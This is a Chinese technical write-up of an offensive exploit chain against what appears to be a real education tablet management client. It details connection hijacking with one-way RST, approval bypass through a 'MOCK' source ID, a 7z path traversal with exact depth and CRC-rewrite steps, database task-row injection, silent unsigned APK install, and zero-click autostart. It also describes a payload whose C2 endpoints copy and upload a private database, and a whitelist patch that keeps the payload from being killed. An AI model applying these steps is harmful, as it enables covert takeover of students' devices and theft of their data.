---
title: "端到端链路的八个环节"

description: "端到端链路的八个环节与最后一个未闭合点"

categories:
  - 技术解析
  - 研究资料
excerpt: 从长连接劫持到代码执行的完整实现记录：八个环节各自的状态与判据，含 7z 任意路径写的深度计算与 CRC 工艺、任务行消费链、静默安装的两个坑、零点击自启的硬编码目标，以及场景白名单修复的五个步骤。
password: xh-research-2026
protect: full
---

# 端到端链路的八个环节

> 分析对象：从长连接接管到代码执行的完整链路实现记录。
> 证据等级：A（代码）+ B（字节/文件）。
> 配套阅读：[[research/smp200]]（现场研究）、[[research/unlocker-architecture]]（工程架构）、[[research/dead-ends]]（死路与场景管控）。

## 一、结论速览

| 环节 | 状态 | 关键判据 |
| --- | --- | --- |
| 1 长连接劫持 | 成立 | 累计 8746 条 ACK |
| 2 消息注入 | 成立 | 客户端发起带 UA 的下载请求 |
| 3 任意路径写 | 成立 | 目标文件落盘且大小正确 |
| 4 任务行注入 | 成立 | launcher 显示「未登录」证明写入生效 |
| 5 静默安装 | 成立 | 8 次任务→下载→安装全链 |
| 6 零点击自启 | 成立 | 进程出现且拿到 uid |
| 7 读原语 | 成立 | 143,360 字节完整副本 |
| 8 持久存活 | **未闭合** | 约 7 秒静默 SIGKILL |

一句话概括：**七个环节全部打通，只差最后一件事——让进程活下来。**

## 二、环节一：长连接劫持

### 2.1 握手

客户端连上目标端口后，先发一个 HTTP 形式的握手，带三个头：

```text
Auth: {"boundId":..., "role":..., "tags":..., "userId":..., "v":"ztkt4"}
DeviceId: <序列号>
```

服务端需回 101 或相应应答，随后进入自定义帧协议。

### 2.2 接管既有连接

设备已经在连真实服务器时，直接抢占会形成双写。做法是：

1. 冒充服务端接受客户端的包，推进序列号（seq-adopt）；
2. 对真实服务器方向发送**单向 RST**，只断开服务器那一侧；
3. 客户端认为连接正常，实际对端已是我方。

判据：端侧 ack 与我方维护值一致，累计 8746 条。

单向 RST 的工具必须只作用于「设备→服务器」一个方向，双向 RST 会自激，实测产生 22 万条包。

### 2.3 心跳与保活

客户端每 30 秒心跳一次。我方需按同样节奏回应，否则客户端主动重连到真实服务器。

## 三、环节二：消息注入

### 3.1 帧内容

```json
{
  "cId": <毫秒>,
  "cmd": 3,
  "smsg": {
    "classRoomId": ...,
    "createTag": "canvas_tag",
    "data": "<任务详情 JSON>",
    "type": 4
  }
}
```

`type=4` 是课堂任务类型。

### 3.2 MOCK 前缀的绕过

代码依据：

```text
ResourceHelper.downLoadResourceBySourceId
  if (sourceId.startsWith("MOCK")) → 清空 sourceId，直连下载
```

正常流程里 `sourceId` 是服务器分配的 ID，需要审批后才允许下载。以 `MOCK` 开头时，客户端跳过审批直接下载我方给的 URL。

**每次投递必须换全新的 `taskId` 与 `sourceId`**——复用会被去重逻辑丢掉，现象是「第二次没反应」。

## 四、环节三：任意路径写

### 4.1 触发路径

```text
ResourceDownLoadService.doHandDownLoadSuccess
  → needDecode(url.endsWith("7z"))
  → Z7Extractor.extractFile
  → libun7zip.so OutFile_OpenUtf16 @ 0x37a4
```

### 4.2 漏洞点

解压库在构造输出路径时直接 `strcpy`/`strcat` 拼接条目名，**不做 `..` 过滤**。导入表里只有 `fopen`/`mkdir`/`strcat`/`strcpy`，没有任何路径规范化函数。

### 4.3 深度计算

从解压根到目标目录的层级差是固定的。实测**恰好 5 层 `../`**：

```text
../../../../../databases/<包名>/<userId>/xh_launcher.db
```

多一层会写到上级目录（文件不存在），少一层会被限制在解压根内。

### 4.4 条目名改写工艺

7z 不允许条目名带 `..`（打包工具会拒绝），所以需要后处理：

1. 先用等长短名打包（如 `aaaa/`）；
2. 对文件做二进制替换：把短名的 UTF-16LE 字节替换为真实路径的 UTF-16LE 字节；
3. 重算两处 CRC：条目头 CRC 与起始头 CRC（后者 = crc32(头 32 字节中的 20 字节)）。

长度必须完全一致——这是整个工艺里最硬的约束，也是为什么路径要提前算好。

### 4.5 附件

同时投递一个**空 WAL 文件**（32 字节）。原因：SQLite 在检测到 WAL 与主库不匹配时可能回滚，空 WAL 让客户端认为「没有未提交事务」。

## 五、环节四：任务行注入

### 5.1 目标位置

```text
<外部存储>/xuehai/<schoolId>/databases/com.xh.zhitongyunstu/<userId>/xh_launcher.db
```

### 5.2 两处修改

| 表 | 修改 |
| --- | --- |
| `app_update_task` | 插入一行：包名、版本码、下载 URL、md5、保存路径、`status=25`、`need_update=1`、`program_type=0`、`update_type=2` |
| `app_info` | 插入目标包一行，`show=1` |

### 5.3 消费链

```text
HomeViewModel.returnTop()
  → resumeInstall()
  → AppUpdateModelImpl.getInstallPauseAppUpdateTask()   // WHERE status=25
  → downloadApp
  → AppUpdateManager.pushDownloadTask
  → downloadAndInstall → processAppUpdateTask
  → realDownloadApp → DownloadManager.downloadFromBox
  → BoxDownload（回落 chain.process()，URL 原样使用）
  → 落盘 save_path
  → AppInstallManager.toInstall
```

### 5.4 两个容易忽略的前提

| 前提 | 后果 |
| --- | --- |
| **必须已登录** | 未登录时 `resumeInstall` 不跑，任务行永远不被消费 |
| 回桌面/网络恢复/重启才触发 | 不在这三个时机里改库，等于没改 |

第一条是整个项目里最贵的教训：整库替换会丢掉会话，而丢了会话任务行就没人读。

## 六、环节五：静默安装

```text
AppInstallManager.installApp
  → postUpdateStatus(0x15)
  → PolicyManager.getApplicationPolicyProxy().installApplication(savePath)
  → /sdcard/ 前缀归一化
  → MdmBinder.installApplication(:1761)
  → getPackageArchiveInfo 判可解析
  → 安装（无签名校验）
```

两个坑：

| 坑 | 现象 | 处理 |
| --- | --- | --- |
| 签名冲突 | `INSTALL_FAILED_UPDATE_INCOMPATIBLE` | 包名与已装应用冲突，换包名 |
| 同 versionCode | 状态被置 `0x65`，不安装 | 每次发版必须 bump |

判据：带 launcher UA 的 `GET /agent.apk` 全天 8 次，每次之后进程出现。

## 七、环节六：零点击自启

```text
HomeViewModel$loadData$1
  → MdmModel.initMdmRules()                    // 无条件
  → ControlAppManager.enableApps()
  → SpecialApp.wakeUpResponse(ctx)             // :245
  → SpecialApp.wakeUp(ctx, "com.xh.arespunc", "com.xh.arespunc.wakeup")  // :1506
  → SpecialApp.wakeUp(:1350)
      isAppInstalled + Intent(action) + flags 0x10a00000 + startActivity
```

关键点：

- 目标包名**硬编码**，所以载荷必须是同名包；
- 包名必须是系统内置包（可覆盖升级）；
- flags 不含 `FLAG_INCLUDE_STOPPED_PACKAGES`，包进入 stopped 态后隐式 intent 解析不到。

## 八、环节七：读原语与 C2

### 8.1 载荷结构

v20 共 15 个类：

| 类 | 职责 |
| --- | --- |
| 入口 Activity | 无界面，启动即 finish |
| 前台服务 | 维持存活 |
| 守护进程 | 双进程互拉 |
| 接收器 ×2 | 开机、外部触发 |
| 定时任务 | 第三腿保活 |
| 通知辅助 | 前台图标修正 |
| MDM 封装 | 按需安装 |
| C2 客户端 | 指令通道 |
| 崩溃捕获 | 全局异常 |
| 取证 | 启动即采集 |
| 场景防御 | 白名单修复 |
| 追踪 | 秒级采样 |
| UDP 信标 | 局域网发现 |
| 指令处理器 | 命令分发 |

### 8.2 C2 端点

| 端点 | 用途 |
| --- | --- |
| `/c2` | 注册 |
| `/cmd` | 拉指令 |
| `/out` | 回传输出 |
| `/up` | 分片上传 |
| `/ctl` | 控制 |

### 8.3 读原语

把真实数据库复制到外部存储，再以 24KB 分片回传：

```text
143,360 字节    md5 e270dd30055a5d477ec59bcd1793e448
```

判据：`svc-create uid=10248 sdk=28`、`fg-ok attempt=1`、`db exists size=143360 copied=143360`。

## 九、环节八：未闭合的 7 秒

这是唯一没解决的环节。

现象：进程起来约 7 秒后静默 SIGKILL，无 `onDestroy`、无异常、无崩溃日志。之后闹钟不响、重启不启动、隐式 intent 失效。

### 9.1 归因

```text
SceneControlStatus.executeThisTime() @ :884
  if (!SessionData.getSysAuthority().isSceneControlEnable()) return;
  → ApplicationManager.getThirdPartyApps()
  → calculateNeedForbiddenList(...)  // :700-820
  → setDisableApplication(pkg)       // 逐个，跳过 webview
```

语义：禁用列表 = 第三方应用 − 场景白名单。

`setApplicationEnabledSetting(DISABLED)` 的效果就是当场 SIGKILL + 进 stopped，与全部现象吻合。

### 9.2 v20 的修复

```text
Defend.java
  1. 递归找 /sdcard/xuehai/config（深度 ≤4）下所有 sceneControl.ini
  2. JSON 文本级 patch：定位 "packageNames" → 找 [ 与匹配 ] → 插入我方包名
  3. 写回原文件
  4. sendBroadcast("com.xuehai.control.action_clear_scene_cache") 两次
     （带 setPackage 与不带各一次）
  5. 取证：pm list packages -d / pm path / pidof，并 dump 每个 ini 前 700 字符
```

第 2 步用文本级 patch 而不是 JSON 解析，是因为 ini 内容可能是被包装/截断的，严格解析会失败。

第 4 步广播两次的原因：带 `setPackage` 会让指定的接收者收到，不带则让动态注册的接收者也能收到。两种注册方式同时存在。

### 9.3 判据表

| 观测 | 结论 |
| --- | --- |
| `def-ini-count ≥ 1` 且之后不再死 | 修复成立 |
| `def-ini-count = 0` 但有目录 | 路径/命名不同，需重出 |
| 死亡时刻 `dis=1` | 确认 disable，扩白名单 |
| 死亡时刻 `dis=0` | 不是 disable，转 force-stop 归因 |

## 十、链路的整体评价

| 维度 | 评价 |
| --- | --- |
| 技术完整性 | 高：七个环节都有 A/B 级证据 |
| 可靠性 | 低：每环节都依赖若干版本敏感假设 |
| 可维护性 | 低：20 个版本迭代才到这一步 |
| 最后一步 | 卡在一条**业务策略**上，而非技术难点 |

这个组合很典型：**技术上的复杂度可以靠时间堆，策略上的判定只有「是/否」。**

---

一句话概括：**打通七个环节花了绝大部分时间，而最后一个环节的答案不在代码里，在策略里。**
